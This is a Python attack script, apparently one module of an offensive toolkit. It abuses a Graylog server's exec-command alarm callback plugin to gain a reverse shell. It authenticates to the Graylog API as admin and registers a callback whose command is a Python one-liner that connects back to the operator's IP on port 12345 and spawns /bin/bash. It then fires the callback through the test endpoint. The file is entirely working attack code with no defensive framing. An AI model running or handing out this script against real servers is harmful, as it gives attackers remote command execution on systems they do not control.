#!/usr/bin/env python3

# Graylog Create Alarm Callback to Obtain Reverse Shell

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import getpass
import logging
import urllib3
import globals
import requests
import colorama

from colorama import Fore
from colorama import Style

colorama.init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# %%%%%%%%%% Functions %%%%%%%%%#


def alarm_callback(ip, port):
	graylogpass = getpass.getpass(
		Fore.CYAN + Style.BRIGHT + "[!] Enter Graylog Admin Password: " +
		Style.RESET_ALL)

	local_ip = input("[!] Enter your local IP address: ")
	alertid = "000000000000000000000000"
	authurl = globals.http + ip + ":" + str(
		port) + "/api/system/sessions"
	typesurl = globals.http + ip + ":" + str(
		port) + "/api/alerts/callbacks/types"
	alarmsurl = globals.http + ip + ":" + str(
		port) + "/api/streams/000000000000000000000001/alarmcallbacks"

	bashcommand = \
		"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,"\
		"socket.SOCK_STREAM);s.connect((\"" + local_ip + \
		"\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),"\
		"1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"

	params = {
		"title": "testgraylog",
		"type": "ir.elenoon.ExeCommandAlarmCallBack",
		"configuration": {
			"bashCommand": bashcommand
		}
	}
	headers = {'X-Requested-By': 'XMLHttpRequest'}
	authparams = {
		'username': 'admin',
		'password': graylogpass,
		'host': ip
	}

	globals.graylog_messages(1)
	try:
		s = requests.Session()
		s.headers.update(headers)
		s.auth = ('admin', graylogpass)
		s.post(authurl, json=authparams, verify=False)
		response = s.get(typesurl, verify=False)

		# text of graylog2 plugin exec
		if response.status_code == 200 and "ir.elenoon.ExeCommandAlarmCallBack" in response.text:
			globals.graylog_messages(2)
			postresponse = s.post(alarmsurl, json=params, verify=False)

			if postresponse.status_code == 201:  # created status code
				globals.graylog_messages(3)
				data = postresponse.json()
				alertid = str(data['alarmcallback_id'])

				if alertid != "000000000000000000000000":
					print("[!] Alarm Callback ID: " + alertid)
					testurl = \
						globals.http + ip + ":9000/api/alerts/callbacks/" + \
						alertid + "/test"
					testresponse = s.post(testurl, verify=False)

					if testresponse.status_code == 200:
						globals.graylog_messages(4)
					else:
						globals.graylog_messages(5)
				else:
					globals.graylog_messages(6)

			else:
				globals.graylog_messages(7)

		else:
			globals.graylog_messages(8)

	except Exception as e:
		logging.error(e, exc_info=True)

# %%%%%%%%%% The End %%%%%%%%%%#
